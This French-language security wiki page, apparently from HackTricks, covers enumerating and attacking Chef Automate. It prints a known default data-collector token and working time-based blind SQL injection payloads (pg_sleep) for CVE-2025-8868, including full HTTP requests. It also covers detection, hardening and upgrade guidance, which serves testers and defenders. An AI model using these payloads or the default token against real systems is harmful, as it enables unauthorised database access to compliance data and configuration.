# Chef Automate Énumération & Attaques

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Cette page rassemble des techniques pratiques pour énumérer et attaquer des instances Chef Automate, avec un accent sur :
- Découvrir les endpoints REST exposés via gRPC-Gateway et déduire les schémas de requête via les réponses de validation/erreur
- Abuser l'en-tête d'authentification x-data-collector-token lorsque des valeurs par défaut sont présentes
- Time-based blind SQL injection dans la Compliance API (CVE-2025-8868) affectant le champ filters[].type dans /api/v0/compliance/profiles/search

> Note : Les réponses backend qui incluent l'en-tête grpc-metadata-content-type: application/grpc indiquent typiquement un gRPC-Gateway faisant le pont entre des appels REST et des services gRPC.

## Recon : Architecture et empreintes

- Front-end : souvent Angular. Les bundles statiques peuvent donner des indices sur les chemins REST (p.ex., /api/v0/...)
- API transport : REST vers gRPC via gRPC-Gateway
- Les réponses peuvent inclure grpc-metadata-content-type: application/grpc
- Empreintes base de données/driver :
- Corps d'erreur commençant par pq: suggèrent fortement PostgreSQL avec le driver Go pq
- Endpoints Compliance intéressants (auth requis) :
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth : Data Collector Token (x-data-collector-token)

Chef Automate expose un data collector qui authentifie les requêtes via un en-tête dédié :

- En-tête : x-data-collector-token
- Risque : Certains environnements peuvent conserver un token par défaut donnant accès à des routes API protégées. Valeur par défaut connue observée en nature :
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

S'il est présent, ce token peut être utilisé pour appeler des endpoints de la Compliance API normalement protégés par l'auth. Pensez toujours à remplacer/désactiver les valeurs par défaut lors du durcissement.

## Inférence du schéma de l'API via la découverte guidée par les erreurs

Les endpoints supportés par gRPC-Gateway often leak des erreurs de validation utiles qui décrivent le modèle de requête attendu.

Pour /api/v0/compliance/profiles/search, le backend attend un body avec un tableau filters, où chaque élément est un objet contenant :

- type : string (identifiant du champ de filtre)
- values : array of strings

Example request shape:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
Un JSON malformé ou des types de champs incorrects déclenchent typiquement des erreurs 4xx/5xx avec des indices, et les en-têtes indiquent le comportement du gRPC-Gateway. Utilisez ces éléments pour cartographier les champs et localiser les surfaces d'injection.

## Compliance API SQL Injection (CVE-2025-8868)

- Point de terminaison affecté: POST /api/v0/compliance/profiles/search
- Injection point: filters[].type
- Classe de vulnérabilité: time-based blind SQL injection in PostgreSQL
- Cause racine: manque de paramétrisation et de mise en liste blanche lors de l'interpolation du champ type dans un fragment SQL dynamique (probablement utilisé pour construire des identifiants/clauses WHERE). Les valeurs spécialement conçues dans type sont évaluées par PostgreSQL.

Exemple de payload time-based fonctionnel:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Notes sur la technique :
- Fermer la chaîne originale avec une apostrophe simple
- Concaténer une sous-requête qui appelle pg_sleep(N)
- Réintégrer le contexte de chaîne via || de sorte que le SQL final reste syntaxiquement valide, quel que soit l'endroit où type est inséré

### Preuve par latence différentielle

Envoyer des requêtes appariées et comparer les temps de réponse pour valider l'exécution côté serveur :

- N = 1 seconde
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5 secondes
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Observed behavior:
- Les temps de réponse augmentent proportionnellement à pg_sleep(N)
- Les réponses HTTP 500 peuvent inclure des détails pq: lors du probing, confirmant l'exécution de chemins SQL

> Tip: Utilisez un validateur de timing (par ex., plusieurs essais avec comparaison statistique) pour réduire le bruit et les faux positifs.

### Impact

Les utilisateurs authentifiés — ou des acteurs non authentifiés abusant d'un x-data-collector-token par défaut — peuvent exécuter du SQL arbitraire dans le contexte PostgreSQL de Chef Automate, mettant en risque la confidentialité et l'intégrité des profils de conformité, de la configuration et de la télémétrie.

### Affected versions / Fix

- CVE: CVE-2025-8868
- Upgrade guidance: Chef Automate 4.13.295 or later (Linux x86) per vendor advisories

## Detection and Forensics

- API layer:
- Surveiller les 500 sur /api/v0/compliance/profiles/search où filters[].type contient des quotes ('), de la concaténation (||) ou des références de fonction comme pg_sleep
- Inspecter les en-têtes de réponse pour grpc-metadata-content-type afin d'identifier les flux gRPC-Gateway
- Database layer (PostgreSQL):
- Auditer les appels à pg_sleep et les erreurs d'identifiant malformé (souvent affichées avec des préfixes pq: provenant du driver pq pour Go)
- Authentication:
- Consigner et alerter sur l'utilisation de x-data-collector-token, en particulier des valeurs par défaut connues, sur l'ensemble des chemins API

## Mitigations and Hardening

- Immediate:
- Faire tourner/désactiver les data collector tokens par défaut
- Restreindre l'ingress vers les endpoints du data collector ; appliquer des tokens forts et uniques
- Code-level:
- Paramétrer les requêtes ; ne jamais concaténer des fragments SQL sous forme de chaînes
- Restreindre strictement par whitelist les valeurs type autorisées côté serveur (enum)
- Éviter l'assemblage dynamique de SQL pour les identifiants/clauses ; si un comportement dynamique est requis, utiliser un quoting sûr des identifiants et des whitelists explicites

## Practical Testing Checklist

- Vérifier si x-data-collector-token est accepté et si la valeur par défaut connue fonctionne
- Cartographier le schéma de requête de la Compliance API en provoquant des erreurs de validation et en lisant les messages/headers d'erreur
- Tester la présence de SQLi dans des champs “de type identifiant” moins évidents (par ex., filters[].type), pas seulement dans les tableaux de valeurs ou les champs texte de premier niveau
- Utiliser des techniques basées sur le temps avec concaténation pour maintenir la validité syntaxique du SQL selon les contextes

## References

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
